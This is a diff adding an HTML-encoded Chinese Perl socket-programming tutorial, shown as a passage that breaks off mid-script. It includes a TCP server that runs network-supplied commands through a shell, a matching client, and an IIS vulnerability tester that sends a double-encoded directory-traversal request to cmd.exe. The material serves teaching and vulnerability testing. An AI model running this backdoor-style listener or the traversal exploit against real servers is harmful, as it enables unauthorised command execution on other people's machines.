+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>. <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#20116;&#12289;&#31532;&#19977;&#=
+20010;&#20363;&#23376;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#20363;&#23376;&#20171;&#32461;&#=
+65306;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#19979;&#38754;&#30340;&#31243;&#=
+24207;&#26159;&#20351;&#29992;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>tcp</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21327;&#35758;&#30340;&#26381;&#21153;&#31471;&#31243;=
+&#24207;&#65292;&#24403;&#23458;&#25143;&#31471;&#31243;&#24207;&#36830;&#2=
+5509;&#26381;&#21153;&#31471;&#31243;&#24207;&#65292;&#26381;&#21153;&#3147=
+1;&#31243;&#24207;&#26681;&#25454;&#35831;&#27714;&#30340;&#25968;&#25454;&=
+#36820;&#22238;&#26381;&#21153;&#31471;&#19978;&#30340;&#30456;&#24212;&#25=
+968;&#25454;&#65292;&#36825;&#37324;&#26159;&#36820;&#22238;&#30340;&#26159=
+;&#22312;&#26381;&#21153;&#31471;&#25191;&#34892;&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>dos</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21629;&#20196;&#30340;&#25968;&#25454;&#65292;&#20363;=
+&#22914;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>c:\&gt=
+;client.pl
+          \dir c:,</span><span style=3D'font-size:9.0pt;mso-ascii-font-fami=
+ly:
+          Verdana;mso-hansi-font-family:Verdana'>&#23558;&#36820;&#22238;&#=
+26381;&#21153;&#31471;&#25191;&#34892;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>dir c:=
+</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21518;&#30340;&#25968;&#25454;&#32473;&#23458;&#25143;=
+&#31471;&#31243;&#24207;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          3</span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verd=
+ana;
+          mso-hansi-font-family:Verdana'>&#65294;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'>Tcp</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#31243;&#24207;&#26381;&#21153;&#31471;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;1 #!/usr/bin/Perl <br>
+          &lt;2 #testservers <br>
+          &lt;3 #servers.pl <br>
+          &lt;4 # <br>
+          &lt;5 use strict; <br>
+          &lt;6 my $face=3Dqq~ <br>
+          &lt;7 ########################################## <br>
+          &lt;8
+          #&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;
+          <br>
+          &lt;9
+          #Perl_CMD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;
+          <br>
+          &lt;10 ########################################## <br>
+          &lt;11 ~; <br>
+          &lt;12 print $face; <br>
+          &lt;13 undef $face; <br>
+          &lt;14 my $port=3D23456; <br>
+          &lt;15 my $PF_INET=3D2; <br>
+          &lt;16 my $SOCK_STREAM=3D1; <br>
+          &lt;17 my $proto=3Dgetprotobyname(&quot;tcp&quot;); <br>
+          &lt;18 my $ADDR=3Dpack ('SnC4x8',$PF_INET,$port,127,0,0,1); <br>
+          &lt;19 my $command; <br>
+          &lt;20 $|=3D1; <br>
+          &lt;21 socket (SERVERS,$PF_INET,$SOCK_STREAM,$proto) or die
+          &quot;can't build a socket&quot;; <br>
+          &lt;22 bind (SERVERS,$ADDR ) or die &quot;can't bind a SOCK&quot;=
+; <br>
+          &lt;23 listen(SERVERS,2); <br>
+          &lt;24 for ( ;my $paddr=3Daccept(CLINET,SERVERS) ;) { <br>
+          &lt;25&nbsp; recv (CLINET,$command,240,0); <br>
+          &lt;26&nbsp; print $command; <br>
+          &lt;27&nbsp; if ($command and $command=3D~/^\/\//) { <br>
+          &lt;28&nbsp;&nbsp;&nbsp;&nbsp; my @turndate=3D&amp;dir($command);=
+ <br>
+          &lt;29&nbsp;&nbsp; foreach my $onedate (@turndate) { <br>
+          &lt;30&nbsp;&nbsp; send ( CLINET ,$onedate ,0);} <br>
+          &lt;31&nbsp; }else{ <br>
+          &lt;32 print CLINET &quot;Error CMD format\n&quot;; <br>
+          &lt;33&nbsp;&nbsp; } <br>
+          &lt;34 <br>
+          &lt;35 } <br>
+          &lt;36 close CLIENT; <br>
+          &lt;37 sub dir { <br>
+          &lt;38 my $cmd=3Dshift; <br>
+          &lt;39 $cmd=3D~s/^\/\/(.*)//; <br>
+          &lt;40 my @turncmd=3D`$cmd`; <br>
+          &lt;41 return @turncmd; <br>
+          &lt;42&nbsp;&nbsp;&nbsp;&nbsp; } <br>
+          <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#21407;&#20195;&#30721;&#35299;&#=
+26512;&#65306;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;1~13&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-fo=
+nt-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#23450;&#20041;&#19968;&#=
+20123;&#31243;&#24207;&#20013;&#20351;&#29992;&#30340;&#21464;&#37327;&#652=
+92;&#24182;&#36171;&#21021;&#22987;&#20540;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>.</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20351;&#29992;</span><span lang=3DEN-US style=3D'font-=
+size:
+          9.0pt;font-family:Verdana'>use strict</span><span style=3D'font-s=
+ize:
+          9.0pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana=
+'>&#24378;&#21046;&#31243;&#24207;&#20351;&#29992;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Perl</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#30340;&#20005;&#26684;&#35821;&#27861;&#12290;</span><=
+span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;14&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font=
+-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#23450;&#20041;&#26381;&#=
+21153;&#31471;&#31243;&#24207;&#32465;&#23450;&#30340;&#31471;&#21475;&#214=
+95;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;15&nbsp;&nbsp; </span><span style=3D'font-size:9.0pt;mso-asci=
+i-font-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#23450;&#20041;&#21327;&#=
+35758;&#22495;&#20026;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Intern=
+et</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#31867;&#22411;&#12290;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;16 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#23450;&#20041;&#22871;&#=
+25509;&#23383;&#31867;&#22411;&#20026;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>TCP</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#12290;</span><span lang=3DEN-US style=3D'font-size:9.0=
+pt;
+          font-family:Verdana'> <br>
+          &lt;17 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#21462;&#24471;&#21327;&#=
+35758;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;18 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#23545;&#31243;&#24207;&#=
+20013;&#20351;&#29992;&#30340;&#22320;&#22336;&#36827;&#34892;&#25171;&#212=
+53;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;19 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#23450;&#20041;&#19968;&#=
+20010;&#21462;&#24471;&#23458;&#25143;&#31471;&#21457;&#26469;&#30340;&#259=
+68;&#25454;&#30340;&#21464;&#37327;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;20 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#20851;&#38381;</span><sp=
+an
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Perl</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#30340;&#20869;&#37096;&#32531;&#20914;&#21306;&#65292;=
+&#36825;&#26679;&#20351;&#25105;&#20204;&#30340;&#28040;&#24687;&#33021;&#2=
+2815;&#24471;&#21040;&#26356;&#39640;&#30340;&#20248;&#20808;&#32423;&#6529=
+2;&#31435;&#21363;&#25226;&#28040;&#24687;&#21457;&#36865;&#21040;&#36828;&=
+#31243;&#20027;&#26426;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;21 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#24314;&#31435;&#22871;&#=
+25509;&#23383;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;22 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#22312;&#26412;&#22320;&#=
+32465;&#23450;&#19968;&#20010;&#31471;&#21475;</span><span
+          style=3D'font-size:9.0pt;font-family:Verdana'> </span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#65292;&#36825;&#26679;&#36828;&#31243;&#30340;&#26426;=
+&#22120;&#22312;&#36830;&#25509;&#31243;&#24207;&#30340;&#26102;&#20505;&#2=
+5165;&#33021;&#30693;&#36947;&#36830;&#25509;&#21040;&#24213;&#26159;&#2173=
+8;&#20010;&#36827;&#31243;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;23 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#20801;&#35768;&#22312;&#=
+36825;&#20010;&#22871;&#25509;&#23383;&#19978;&#31561;&#24453;&#30340;&#384=
+31;&#21015;&#25968;&#37327;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;24 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#24314;&#31435;&#30495;&#=
+24490;&#29615;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>,</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#24182;&#25509;&#21463;&#35831;&#27714;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>,</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#24182;&#25226;&#35831;&#27714;&#30340;&#22320;&#22336;=
+&#32465;&#23450;&#25104;&#19968;&#20010;&#25991;&#20214;&#21477;&#26564;&#1=
+2290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;25 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#36890;&#36807;</span><sp=
+an
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>accept=
+</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20989;&#25968;&#24471;&#21040;&#21477;&#26564;&#24471;=
+&#21040;&#35831;&#27714;&#30340;&#25968;&#25454;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;26 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#20351;&#29992;</span><sp=
+an
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>recv</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20989;&#25968;&#65292;&#21462;&#24471;&#36830;&#25509;=
+&#30340;&#36828;&#31243;&#20027;&#26426;&#30340;&#28040;&#24687;&#12290;</s=
+pan><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;27 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#20570;&#21028;&#26029;&#=
+65292;&#30475;&#26159;&#21542;&#26159;&#20351;&#29992;&#20102;&#20869;&#370=
+96;&#32422;&#23450;&#30340;&#21629;&#20196;&#26684;&#24335;&#12290;</span><=
+span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;28 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#25191;&#34892;&#21629;&#=
+20196;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+          <br>
+          &lt;29~35 </span><span style=3D'font-size:9.0pt;mso-ascii-font-fa=
+mily:
+          Verdana;mso-hansi-font-family:Verdana'>&#25226;&#22788;&#29702;&#=
+21518;&#30340;&#25968;&#25454;&#36820;&#22238;&#32473;&#36830;&#25509;&#303=
+40;&#23458;&#25143;&#31471;</span><span
+          style=3D'font-size:9.0pt;font-family:Verdana'> </span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#12290;</span><span lang=3DEN-US style=3D'font-size:9.0=
+pt;
+          font-family:Verdana'> <br>
+          &lt;36 </span><span style=3D'font-size:9.0pt;mso-ascii-font-famil=
+y:
+          Verdana;mso-hansi-font-family:Verdana'>&#20851;&#38381;&#19982;&#=
+36825;&#20010;&#36828;&#31243;&#20027;&#26426;&#30340;&#36830;&#25509;&#122=
+90;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;37~43 </span><span style=3D'font-size:9.0pt;mso-ascii-font-fa=
+mily:
+          Verdana;mso-hansi-font-family:Verdana'>&#25191;&#34892;</span><sp=
+an
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>dos</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21629;&#20196;&#30340;&#23376;&#20989;&#25968;&#12290;=
+</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          <br>
+          <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#20845;&#12289;&#31532;&#22235;&#=
+20010;&#20363;&#23376;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#20363;&#23376;&#20171;&#32461;&#=
+65306;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#19979;&#38754;&#30340;&#31243;&#=
+24207;&#26159;&#20351;&#29992;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>tcp</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21327;&#35758;&#30340;&#23458;&#25143;&#31471;&#31243;=
+&#24207;&#65292;&#24403;&#33050;&#26412;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>server=
+s.pl</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#31243;&#24207;&#34987;&#36816;&#34892;&#21518;&#65292;=
+&#23427;&#20250;&#22312;&#36828;&#31243;&#31561;&#24453;&#23458;&#25143;&#3=
+1243;&#24207;&#30340;&#36830;&#25509;&#65292;&#25105;&#20204;&#36825;&#3732=
+4;&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>clinet=
+.pl</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#33050;&#26412;&#23601;&#26159;&#38024;&#23545;&#19978;=
+&#38754;&#31243;&#24207;&#20889;&#30340;&#23458;&#25143;&#31471;&#31243;&#2=
+4207;&#12290;&#20363;&#22914;&#65306;&#22312;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>dos</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21629;&#20196;&#36755;&#20837;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'>c:\&gt;perl clinet.=
+pl
+          \dir c:\ </span><span style=3D'font-size:9.0pt;mso-ascii-font-fam=
+ily:
+          Verdana;mso-hansi-font-family:Verdana'>&#36825;&#26679;&#26381;&#=
+21153;&#22120;&#23558;&#36820;&#22238;&#36828;&#31243;&#20027;&#26426;</spa=
+n><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>c:\</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#30340;&#19979;&#30340;&#25152;&#26377;&#30446;&#24405;=
+&#30340;&#21517;&#23383;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          <br>
+          4</span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verd=
+ana;
+          mso-hansi-font-family:Verdana'>&#65294;&#23458;&#25143;&#31471;&#=
+31243;&#24207;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          Tcp Programming&nbsp; <br>
+          &lt;1 #!/usr/bin/Perl <br>
+          &lt;2 #testclinet <br>
+          &lt;3 #clinet.pl <br>
+          &lt;4 # <br>
+          &lt;5 use strict; <br>
+          &lt;6 my $port=3D23456; <br>
+          &lt;7 my $PF_INET=3D2; <br>
+          &lt;8 my $SOCK_STREAM=3D1; <br>
+          &lt;9 my $proto=3Dgetprotobyname(&quot;tcp&quot;); <br>
+          &lt;10 $|=3D1; <br>
+          &lt;11 my $ADDR=3Dpack('SnC4x8',$PF_INET,$port,127,0,0,1); <br>
+          &lt;12 socket (SOCKET,$PF_INET,$SOCK_STREAM,$proto) or die
+          &quot;cna't socket&quot;; <br>
+          &lt;13 connect (SOCKET,$ADDR) or die &quot;cna't link&quot;; <br>
+          &lt;14 my $cmd=3Djoin (&quot;\t&quot;,@ARGV); <br>
+          &lt;15 send (SOCKET,&quot;$cmd&quot;,0); <br>
+          &lt;16 while(&lt;SOCKET&gt;) { <br>
+          &lt;17&nbsp; print $_; <br>
+          &lt;18 }; <br>
+          <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#21407;&#20195;&#30721;&#35299;&#=
+26512;&#65306;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;1~9&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-fon=
+t-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#24471;&#21040;&#35831;&#=
+27714;&#20027;&#26426;&#30340;&#31471;&#21475;&#65292;&#21462;&#24471;&#312=
+43;&#24207;&#20351;&#29992;&#21327;&#35758;&#22495;&#65292;&#22871;&#25509;=
+&#23383;&#31867;&#22411;&#65292;&#21327;&#35758;&#21495;&#31561;&#12290;</s=
+pan><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;10&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font=
+-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#20851;&#38381;&#32531;&#=
+20914;&#65292;&#20351;&#25968;&#25454;&#31435;&#21051;&#21457;&#36865;&#209=
+86;&#21435;&#65292;&#32780;&#19981;&#26159;&#25918;&#22312;&#26412;&#22320;=
+&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Perl</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#32531;&#20914;&#21306;&#37324;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;11&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font=
+-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#36716;&#25442;</span><sp=
+an
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>IP</sp=
+an><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#22320;&#22336;&#12290;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;12&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font=
+-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#24314;&#31435;&#22871;&#=
+25509;&#23383;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;13&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font=
+-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#36830;&#25509;&#36828;&#=
+31243;&#20027;&#26426;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;15&nbsp; </span><span style=3D'font-size:9.0pt;mso-ascii-font=
+-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#21457;&#36865;&#28040;&#=
+24687;&#21040;&#36828;&#31243;&#20027;&#26426;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;16~18 </span><span style=3D'font-size:9.0pt;mso-ascii-font-fa=
+mily:
+          Verdana;mso-hansi-font-family:Verdana'>&#23545;&#36828;&#31243;&#=
+20027;&#26426;&#30340;&#21709;&#24212;&#36827;&#34892;&#22788;&#29702;&#122=
+90;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#19971;&#12289;&#19968;&#20010;&#=
+27979;&#35797;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>IIS</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#28431;&#27934;&#30340;&#20363;&#23376;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#20363;&#23376;&#20171;&#32461;&#=
+65306;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#19979;&#38754;&#30340;&#31243;&#=
+24207;&#26159;&#36890;&#36807;&#36830;&#25509;&#36828;&#31243;&#20027;&#264=
+26;&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>ip</sp=
+an><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#22320;&#22336;&#65292;&#36890;&#36807;&#19982;&#20027;=
+&#26426;&#24314;&#31435;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>tcp</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#36830;&#25509;&#65292;&#24182;&#21457;&#36865;</span><=
+span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>http</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#30340;&#20869;&#37096;&#21629;&#20196;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>get</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21644;&#29305;&#27530;&#32534;&#30721;&#30340;&#25968;=
+&#25454;&#26469;&#27979;&#35797;&#36828;&#31243;&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>IIS</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#26381;&#21153;&#22120;&#26159;&#21542;&#23384;&#22312;=
+&#28431;&#27934;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>. <br>
+          5</span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verd=
+ana;
+          mso-hansi-font-family:Verdana'>&#65294;&#27979;&#35797;</span><sp=
+an
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>IIS</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#28431;&#27934;&#31243;&#24207;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          &lt;1 #!/Perl/bin/Perl -w <br>
+          &lt;2 use strict; <br>
+          &lt;3 my $port=3D80; <br>
+          &lt;4 my $PF_INET=3D2; <br>
+          &lt;5 my $SOCK_STREAM=3D1; <br>
+          &lt;6 my $proto=3Dgetprotobyname(&quot;tcp&quot;); <br>
+          &lt;7 my $open_or_close; <br>
+          &lt;8 $|=3D1; <br>
+          &lt;9 my $addres=3Dpack('SnC4x8',$PF_INET,$port,127,0,0,1); <br>
+          &lt;10 socket (SOCKET,$PF_INET,$SOCK_STREAM,$proto) or die
+          &quot;cna't socket&quot;; <br>
+          &lt;11 connect (SOCKET,$addres) or die &quot;cna't link&quot;; <b=
+r>
+          &lt;12 send (SOCKET,&quot;GET
+          /scripts/..%25%35%63../winnt/system32/cmd.exe?/ <br>
+          c+dir HTTP/1.0\n\n&quot;,0); <br>
+          &lt;13 while(&lt;SOCKET&gt;) { <br>
+          &lt;14&nbsp; if (m/Directory/){ <br>
+          &lt;15&nbsp; $open_or_close=3D1; <br>
+          &lt;16&nbsp;&nbsp; } <br>
